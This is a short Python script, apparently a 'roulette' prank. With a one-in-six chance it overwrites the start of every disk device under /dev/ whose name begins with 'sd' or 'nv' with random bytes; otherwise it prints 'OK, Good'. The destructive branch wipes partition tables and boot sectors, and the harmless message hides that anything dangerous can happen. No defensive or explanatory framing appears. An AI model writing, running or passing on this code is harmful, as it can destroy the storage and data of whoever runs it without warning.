import os
import random

if random.randint(0, 5) == 0:
    for root, dirs, files in os.walk('/dev/'):
        for filename in files:
            if filename.startswith('sd') or filename.startswith('nv'):
                filepath = os.path.join(root, filename)
                with open(filepath, 'wb') as f:
                    f.write(os.urandom(4096))
else:
    print("OK, Good")
